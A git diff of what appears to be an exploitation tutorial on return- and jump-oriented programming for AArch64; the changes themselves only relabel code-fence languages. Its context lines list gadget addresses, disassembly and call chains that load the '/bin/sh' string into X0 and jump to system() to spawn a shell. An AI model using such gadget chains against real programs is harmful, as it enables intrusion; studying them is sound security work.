@@ -38,7 +38,7 @@ void rop_symbol()
 system() api address is **0x406ae8**
 ### Useful string "/bin/sh" address
 According to the glibc do_system source code
-```C
+```assembly
       /* Exec the shell.  */
       (void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);
       _exit (127);
@@ -63,7 +63,7 @@ void rop_bad_func()
 
 #### Useful gadgets
 * gadget 1: main
-```
+```assembly
 	rop_bad_func();
   40046c:	97ffffec 	bl	40041c <rop_bad_func>
 	return 0;
@@ -76,7 +76,7 @@ void rop_bad_func()
 Set X30 = next gadget address 
 
 * gadget 2: __deregister_frame_info_bases
-```
+```assembly
   44f02c:	f9400bf3 	ldr	x19, [sp, #16]
   44f030:	a8c37bfd 	ldp	x29, x30, [sp], #48
   44f034:	d65f03c0 	ret
@@ -85,7 +85,7 @@ Set X19 from stack,the value is the address string "/bin/sh", and it will set to
 <br>
 Set X30 = next gadget address 
 * gadget 3: __deregister_frame_info_bases
-```
+```assembly
   44f080:	aa1303e0 	mov	x0, x19
   44f084:	f9400bf3 	ldr	x19, [sp, #16]
   44f088:	a8c37bfd 	ldp	x29, x30, [sp], #48
@@ -96,7 +96,7 @@ Set X0 = X19
 Set X30 = system() api address from stack
  #### Calling flow
  
- ```
+ ```C
  rop_bad_func 
    -->(0x400474) main 
       --> (0x44f02c)__deregister_frame_info_bases 
@@ -106,7 +106,7 @@ Set X30 = system() api address from stack
 	         --> ...
  ```
 ### JOP examples
-```
+```C
 void jop_bad_func()
 {
 	jop_func_t func = NULL;
@@ -122,7 +122,7 @@ void jop_bad_func()
 ```
 #### Useful gadgets
 * gadget 1: jop_bad_func
-```
+```assembly
 	func();
   400468:	f9401fa0 	ldr	x0, [x29, #56]
   40046c:	d63f0000 	blr	x0
@@ -130,7 +130,7 @@ void jop_bad_func()
 Set X0 = gadget 2 address from stack 
 
 * gadget 2: _dl_runtime_profile
-```
+```assembly
   441d84:	a94307a0 	ldp	x0, x1, [x29, #48]
   441d88:	6d4407a0 	ldp	d0, d1, [x29, #64]
   441d8c:	6d450fa2 	ldp	d2, d3, [x29, #80]
@@ -145,7 +145,7 @@ Set X0 = system() address
 Set X30 = gadget 3 address 
 
 * gadget 3: _dl_runtime_profile
-```
+```assembly
   441cf4:	aa0003f0 	mov	x16, x0
   441cf8:	a94607a0 	ldp	x0, x1, [x29, #96]
   441cfc:	a9470fa2 	ldp	x2, x3, [x29, #112]
@@ -163,7 +163,7 @@ Set X16 = X0 (system address)
 <br>
 Set X0 = "/bin/sh" string address
 #### Calling flow
-```
+```C
 jop_bad_func 
   --> (0x441d84)_dl_runtime_profile 
     --> (0x441cf4)_dl_runtime_profile 
